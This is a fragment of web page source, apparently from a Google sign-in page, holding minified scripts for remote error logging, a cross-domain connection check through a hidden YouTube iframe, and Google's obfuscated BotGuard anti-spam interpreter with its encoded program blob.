</script>
  <script>var G;var Gb=function(a,b){var c=a;a&&"string"==typeof a&&(c=document.getElementById(a));if(b&&!c)throw new Ga(a);return c},Ga=function(a){this.id=a;this.toString=function(){return"No element found for id '"+this.id+"'"}};var Gc={},Gd;Gd=window.addEventListener?function(a,b,c){var d=function(a){var b=c.call(this,a);!1===b&&Ge(a);return b};a=Gb(a,!0);a.addEventListener(b,d,!1);Gf(a,b).push(d);return d}:window.attachEvent?function(a,b,c){a=Gb(a,!0);var d=function(){var b=window.event,d=c.call(a,b);!1===d&&Ge(b);return d};a.attachEvent("on"+b,d);Gf(a,b).push(d);return d}:void 0;var Ge=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;return!1};
var Gf=function(a,b){Gc[a]=Gc[a]||{};Gc[a][b]=Gc[a][b]||[];return Gc[a][b]};var Gg=function(){try{return new XMLHttpRequest}catch(a){for(var b=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],c=0;c<b.length;c++)try{return new ActiveXObject(b[c])}catch(d){}}return null},Gh=function(){this.g=Gg();this.parameters={}};Gh.prototype.oncomplete=function(){};
Gh.prototype.send=function(a){var b=[],c;for(c in this.parameters){var d=this.parameters[c];b.push(c+"="+encodeURIComponent(d))}var b=b.join("&"),e=this.g,f=this.oncomplete;e.open("POST",a,!0);e.setRequestHeader("Content-type","application/x-www-form-urlencoded");e.onreadystatechange=function(){4==e.readyState&&f({status:e.status,text:e.responseText})};e.send(b)};
Gh.prototype.get=function(a){var b=this.oncomplete,c=this.g;c.open("GET",a,!0);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var Gj=function(a){this.e=a;this.k=this.l();if(null==this.e)throw new Gi("Empty module name");};G=Gj.prototype;G.l=function(){var a=window.location.pathname;return a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
G.n=function(a,b,c){var d=this.k,e=this.e||"",d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var f=Math.floor(1E4*Math.random()),d=d+"&r="+String(f)}catch(g){}return d};G.send=function(a,b,c){var d=new Gh;d.parameters={};try{var e=this.n(a,b,c);d.get(e)}catch(f){}};G.error=function(a,b){this.send("ERROR",a,b)};G.warn=function(a,b){this.send("WARN",a,b)};
G.info=function(a,b){this.send("INFO",a,b)};G.f=function(a){var b=this;return function(){try{return a.apply(null,arguments)}catch(c){throw b.error("Uncatched exception: "+c),c;}}};var Gi=function(){};var Gk=Gk||new Gj("uri"),Gl=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([\\w\\d\\-\\u0100-\\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"),Gm=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:null},Gn=function(a,b){var c=b.match(Gl)[1]||null,d,e=b.match(Gl)[3]||null;d=e&&decodeURIComponent(e);e=Number(b.match(Gl)[4]||null)||null;if(!c||!d)return Gk.error("Invalid origin Exception",[String(b)]),!1;e||(e=Gm(c));var f=a.match(Gl)[1]||null;if(!f||f.toLowerCase()!=
c.toLowerCase())return!1;c=(c=a.match(Gl)[3]||null)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=d.toLowerCase())return!1;(d=Number(a.match(Gl)[4]||null)||null)||(d=Gm(f));return e==d};var Go=Go||new Gj("check_connection"),Gp="^([^:]+):(\\d*):(\\d?)$",Gq=null,Gr=null,Gs=null,Gt=function(a,b){this.c=a;this.b=b;this.a=!1};G=Gt.prototype;G.h=function(a,b){if(!b)return!1;if(0<=a.indexOf(","))return Go.error("CheckConnection result contains comma",[a]),!1;var c=b.value;b.value=c?c+","+a:a;return!0};G.d=function(a){return this.h(a,Gr)};G.j=function(a){return this.h(a,Gs)};G.i=function(a){a=a.match(Gp);return!a||3>a.length?null:a[1]};
G.p=function(a,b){if(!Gn(this.c,a))return!1;if(this.a||!b)return!0;"accessible"==b?(this.d(a),this.a=!0):this.i(b)==this.b&&(this.j(b)||this.d(a),this.a=!0);return!0};G.m=function(){var a;a=this.c;var b="timestamp",c=String((new Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL Exception: "+a);return a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
G.o=function(){var a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.m();a.id=this.b;Gq.appendChild(a)};
var Gu=function(a){return function(b){var c=b.origin.toLowerCase();b=b.data;for(var d=a.length,e=0;e<d&&!a[e].p(c,b);e++);}},Gv=function(){if(window.postMessage){var a;a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var b=window.__CHECK_CONNECTION_CONFIG.connectivityElementId,c=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gq=document.getElementById(a))?(b&&(Gr=document.getElementById(b)),c&&(Gs=document.getElementById(c)),Gr||Gs?a=!0:(Go.error("Unable to locate the input element to storeCheckConnection result",
["old id: "+String(b),"new id: "+String(c)]),a=!1)):(Go.error("Unable to locate the iframe anchor to append connection test iframe",["element id: "+a]),a=!1);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Go.error("Missing iframe URL in old configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){for(var b=a.length,c=[],d=0;d<b;d++)c.push(new Gt(a[d].iframeUri,a[d].domainSymbol));
Gd(window,"message",Gu(c));for(d=0;d<b;d++)c[d].o()}}}},Gw=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Go.error("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Go.f(Gv);G_setPostMessageSupportFlag=Go.f(Gw);
</script>
  <script>
  window.__CHECK_CONNECTION_CONFIG = {
  newResultElementId: 'checkConnection',
  domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\75https%3A%2F%2Faccounts.google.com\46v\75-589674185',domainSymbol: 'youtube'}],
  iframeUri: '',
  iframeOrigin: '',
  connectivityElementId: 'dnConn',
  iframeParentElementId: 'cc_iframe_parent',
  postMsgSupportElementId: 'pstMsg',
  msgContent: 'accessible'
  };
  G_setPostMessageSupportFlag();
  G_checkConnectionMain();
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29tCg== */(function(){eval('var f,g=this,k=void 0,n=Date.now||function(){return+new Date},q=function(a,b,c,d,e){c=a.split("."),d=g,c[0]in d||!d.execScript||d.execScript("var "+c[0]);for(;c.length&&(e=c.shift());)c.length||b===k?d=d[e]?d[e]:d[e]={}:d[e]=b},s=function(a,b,c){if(b=typeof a,"object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;if(c=Object.prototype.toString.call(a),"[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},t=(new function(){n()},function(a,b){a.m=("E:"+b.message+":"+b.stack).slice(0,2048)}),v=function(a,b){for(b=Array(a);a--;)b[a]=255*Math.random()|0;return b},w=function(a,b){return a[b]<<24|a[b+1]<<16|a[b+2]<<8|a[b+3]},z=function(a,b){a.K.push(a.c.slice()),a.c[a.b]=k,x(a,a.b,b)},A=function(a,b,c){return c=function(){return a},b=function(){return c()},b.V=function(b){a=b},b},C=function(a,b,c,d){return function(){if(!d||a.q)return x(a,a.P,arguments),x(a,a.k,c),B(a,b)}},D=function(a,b,c,d){for(c=[],d=b-1;0<=d;d--)c[b-1-d]=a>>8*d&255;return c},B=function(a,b,c,d){return c=a.a(a.b),a.e&&c<a.e.length?(x(a,a.b,a.e.length),z(a,b)):x(a,a.b,b),d=a.s(),x(a,a.b,c),d},F=function(a,b,c,d){for(b={},b.N=a.a(E(a)),b.O=E(a),c=E(a)-1,d=E(a),b.self=a.a(d),b.C=[];c--;)d=E(a),b.C.push(a.a(d));return b},G=function(a,b){return b<=a.ca?b==a.h||b==a.d||b==a.f||b==a.o?a.n:b==a.P||b==a.H||b==a.I||b==a.k?a.v:b==a.w?a.i:4:[1,2,4,a.n,a.v,a.i][b%a.da]},H=function(a,b,c,d){try{for(d=0;84941944608!=d;)a+=(b<<4^b>>>5)+b^d+c[d&3],d+=2654435769,b+=(a<<4^a>>>5)+a^d+c[d>>>11&3];return[a>>>24,a>>16&255,a>>8&255,a&255,b>>>24,b>>16&255,b>>8&255,b&255]}catch(e){throw e;}},x=function(a,b,c){if(b==a.b||b==a.l)a.c[b]?a.c[b].V(c):a.c[b]=A(c);else if(b!=a.d&&b!=a.f&&b!=a.h||!a.c[b])a.c[b]=I(c,a.a);b==a.p&&(a.t=k,x(a,a.b,a.a(a.b)+4))},J=function(a,b,c,d,e){for(a=a.replace(/\\r\\n/g,"\\n"),b=[],d=c=0;d<a.length;d++)e=a.charCodeAt(d),128>e?b[c++]=e:(2048>e?b[c++]=e>>6|192:(b[c++]=e>>12|224,b[c++]=e>>6&63|128),b[c++]=e&63|128);return b},E=function(a,b,c){if(b=a.a(a.b),!(b in a.e))throw a.g(a.Y),a.u;return a.t==k&&(a.t=w(a.e,b-4),a.B=k),a.B!=b>>3&&(a.B=b>>3,c=[0,0,0,a.a(a.p)],a.Z=H(a.t,a.B,c)),x(a,a.b,b+1),a.e[b]^a.Z[b%8]},I=function(a,b,c,d,e,h,l,p,m){return p=K,e=K.prototype,h=e.s,l=e.Q,m=e.g,d=function(){return c()},c=function(a,r,u){for(u=0,a=d[e.D],r=a===b,a=a&&a[e.D];a&&a!=h&&a!=l&&a!=p&&a!=m&&20>u;)u++,a=a[e.D];return c[e.ga+r+!(!a+(u>>2))]},d[e.J]=e,c[e.fa]=a,a=k,d},L=function(a,b,c,d,e,h){for(e=a.a(b),b=b==a.f?function(b,c,d,h){try{c=e.length,d=c-4>>3,e.ba!=d&&(e.ba=d,d=(d<<3)-4,h=[0,0,0,a.a(a.G)],e.aa=H(w(e,d),w(e,d+4),h)),e.push(e.aa[c&7]^b)}catch(r){throw r;}}:function(a){e.push(a)},d&&b(d&255),h=0,d=c.length;h<d;h++)b(c[h])},K=function(a,b,c,d,e,h){try{if(this.j=2048,this.c=[],x(this,this.b,0),x(this,this.l,0),x(this,this.p,0),x(this,this.h,[]),x(this,this.d,[]),x(this,this.H,"object"==typeof window?window:g),x(this,this.I,this),x(this,this.r,0),x(this,this.F,0),x(this,this.G,0),x(this,this.f,v(4)),x(this,this.o,[]),x(this,this.k,{}),this.q=true,a&&"!"==a[0])this.m=a;else{if(window.atob){for(c=window.atob(a),a=[],e=d=0;e<c.length;e++){for(h=c.charCodeAt(e);255<h;)a[d++]=h&255,h>>=8;a[d++]=h}b=a}else b=null;(this.e=b)&&this.e.length?(this.K=[],this.s()):this.g(this.U)}}catch(l){t(this,l)}};f=K.prototype,f.b=0,f.p=1,f.h=2,f.l=3,f.d=4,f.w=5,f.P=6,f.L=8,f.H=9,f.I=10,f.r=11,f.F=12,f.G=13,f.f=14,f.o=15,f.k=16,f.ca=17,f.R=15,f.$=12,f.S=10,f.T=42,f.da=6,f.i=-1,f.n=-2,f.v=-3,f.U=17,f.W=21,f.A=22,f.ea=30,f.Y=31,f.X=33,f.u={},f.D="caller",f.J="toString",f.ga=34,f.fa=36,K.prototype.a=function(a,b){if(b=this.c[a],b===k)throw this.g(this.ea,0,a),this.u;return b()},K.prototype.ka=function(a,b,c,d){d=a[(b+2)%3],a[b]=a[b]-a[(b+1)%3]-d^(1==b?d<<c:d>>>c)},K.prototype.ja=function(a,b,c,d){if(3==a.length){for(c=0;3>c;c++)b[c]+=a[c];for(c=0,d=[13,8,13,12,16,5,3,10,15];9>c;c++)b[3](b,c%3,d[c])}},K.prototype.la=function(a,b){b.push(a[0]<<24|a[1]<<16|a[2]<<8|a[3]),b.push(a[4]<<24|a[5]<<16|a[6]<<8|a[7]),b.push(a[8]<<24|a[9]<<16|a[10]<<8|a[11])},K.prototype.g=function(a,b,c,d){d=this.a(this.l),a=[a,d>>8&255,d&255],c!=k&&a.push(c),0==this.a(this.h).length&&(this.c[this.h]=k,x(this,this.h,a)),b&&3<this.j&&(c="",b.message&&(c+=b.message),b.stack!=k&&(c+=": "+b.stack),c=c.slice(0,this.j-3),this.j-=c.length+3,c=J(c),L(this,this.f,D(c.length,2).concat(c),this.$))},f.M=[function(){},function(a,b,c,d,e){b=E(a),c=E(a),d=a.a(b),b=G(a,b),e=G(a,c),e==a.i||e==a.n?d=""+d:0<b&&(1==b?d&=255:2==b?d&=65535:4==b&&(d&=4294967295)),x(a,c,d)},function(a,b,c,d,e,h,l,p,m){if(b=E(a),c=G(a,b),0<c){for(d=0;c--;)d=d<<8|E(a);x(a,b,d)}else if(c!=a.v){if(d=E(a)<<8|E(a),c==a.i)if(c="",a.c[a.w]!=k)for(e=a.a(a.w);d--;)h=e[E(a)<<8|E(a)],c+=h;else{for(c=Array(d),e=0;e<d;e++)c[e]=E(a);for(d=c,c=[],h=e=0;e<d.length;)l=d[e++],128>l?c[h++]=String.fromCharCode(l):191<l&&224>l?(p=d[e++],c[h++]=String.fromCharCode((l&31)<<6|p&63)):(p=d[e++],m=d[e++],c[h++]=String.fromCharCode((l&15)<<12|(p&63)<<6|m&63));c=c.join("")}else for(c=Array(d),e=0;e<d;e++)c[e]=E(a);x(a,b,c)}},function(a){E(a)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),c=a.a(c),b=a.a(b),x(a,d,b[c])},function(a,b,c){b=E(a),c=E(a),b=a.a(b),x(a,c,s(b))},function(a,b,c,d,e){b=E(a),c=E(a),d=G(a,b),e=G(a,c),c!=a.h&&(d==a.i&&e==a.i?(a.c[c]==k&&x(a,c,""),x(a,c,a.a(c)+a.a(b))):e==a.n&&(0>d?(b=a.a(b),d==a.i&&(b=J(""+b)),c!=a.d&&c!=a.f&&c!=a.o||L(a,c,D(b.length,2)),L(a,c,b)):0<d&&L(a,c,D(a.a(b),d))))},function(a,b,c){b=E(a),c=E(a),x(a,c,function(a){return eval(a)}(a.a(b)))},function(a,b,c){b=E(a),c=E(a),x(a,c,a.a(c)-a.a(b))},function(a,b){b=F(a),x(a,b.O,b.N.apply(b.self,b.C))},function(a,b,c){b=E(a),c=E(a),x(a,c,a.a(c)%a.a(b))},function(a,b,c,d,e){b=E(a),c=a.a(E(a)),d=a.a(E(a)),e=a.a(E(a)),a.a(b).addEventListener(c,C(a,d,e,true),false)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),a.a(b)[a.a(c)]=a.a(d)},function(){},function(a,b,c){b=E(a),c=E(a),x(a,c,a.a(c)+a.a(b))},function(a,b,c){b=E(a),c=E(a),0!=a.a(b)&&x(a,a.b,a.a(c))},function(a,b,c,d){b=E(a),c=E(a),d=E(a),a.a(b)==a.a(c)&&x(a,d,a.a(d)+1)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),a.a(b)>a.a(c)&&x(a,d,a.a(d)+1)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,a.a(b)<<c)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,a.a(b)|a.a(c))},function(a,b){b=a.a(E(a)),z(a,b)},function(a,b,c,d){if(b=a.K.pop()){for(c=E(a);0<c;c--)d=E(a),b[d]=a.c[d];a.c=b}else x(a,a.b,a.e.length)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,(a.a(b)in a.a(c))+0)},function(a,b,c,d){b=E(a),c=a.a(E(a)),d=a.a(E(a)),x(a,b,C(a,c,d))},function(a,b,c){b=E(a),c=E(a),x(a,c,a.a(c)*a.a(b))},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,a.a(b)>>c)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,a.a(b)||a.a(c))},function(a,b,c,d,e){b=F(a),c=b.C,d=b.self,e=b.N;switch(c.length){case 0:c=new d[e];break;case 1:c=new d[e](c[0]);break;case 2:c=new d[e](c[0],c[1]);break;case 3:c=new d[e](c[0],c[1],c[2]);break;case 4:c=new d[e](c[0],c[1],c[2],c[3]);break;default:a.g(a.A);return}x(a,b.O,c)},function(a,b,c,d,e,h){if(b=E(a),c=E(a),d=E(a),e=E(a),b=a.a(b),c=a.a(c),d=a.a(d),a=a.a(e),"object"==s(b)){for(h in e=[],b)e.push(h);b=e}for(e=0,h=b.length;e<h;e+=d)c(b.slice(e,e+d),a)}],K.prototype.ia=function(a){return(a=window.performance)&&a.now?function(){return a.now()|0}:function(){return+new Date}}(),K.prototype.ha=function(a,b){return b=this.Q(),a&&a(b),b},K.prototype.s=function(a,b,c,d,e,h){try{for(b=2001,c=k,d=0,a=this.e.length;--b&&(d=this.a(this.b))<a;)try{x(this,this.l,d),e=E(this)%this.M.length,(c=this.M[e])?c(this):this.g(this.W,0,e)}catch(l){l!=this.u&&((h=this.a(this.r))?(x(this,h,l),x(this,this.r,0)):this.g(this.A,l))}b||this.g(this.X)}catch(p){try{this.g(this.A,p)}catch(m){t(this,m)}}return this.a(this.k)},K.prototype.Q=function(a,b,c,d,e,h,l,p,m,y,r){if(this.m)return this.m;try{if(this.q=false,b=this.a(this.d).length,c=this.a(this.f).length,d=this.j,this.c[this.L]&&B(this,this.a(this.L)),e=this.a(this.h),0<e.length&&L(this,this.d,D(e.length,2).concat(e),this.R),h=this.a(this.F)&255,h-=this.a(this.d).length+4,l=this.a(this.f),4<l.length&&(h-=l.length+3),0<h&&L(this,this.d,D(h,2).concat(v(h)),this.S),4<l.length&&L(this,this.d,D(l.length,2).concat(l),this.T),p=[3].concat(this.a(this.d)),window.btoa?(y=window.btoa(String.fromCharCode.apply(null,p)),m=y=y.replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,"")):m=k,m)m="!"+m;else for(m="",e=0;e<p.length;e++)r=p[e][this.J](16),1==r.length&&(r="0"+r),m+=r;a=m,this.j=d,this.q=true,this.a(this.d).length=b,this.a(this.f).length=c}catch(u){t(this,u),a=this.m}return a};try{window.addEventListener("unload",function(){},false)}catch(M){}q("botguard.bg",K),q("botguard.bg.prototype.invoke",K.prototype.ha);')})()</script>
  <script type="text/javascript">
  document.bg = new botguard.bg('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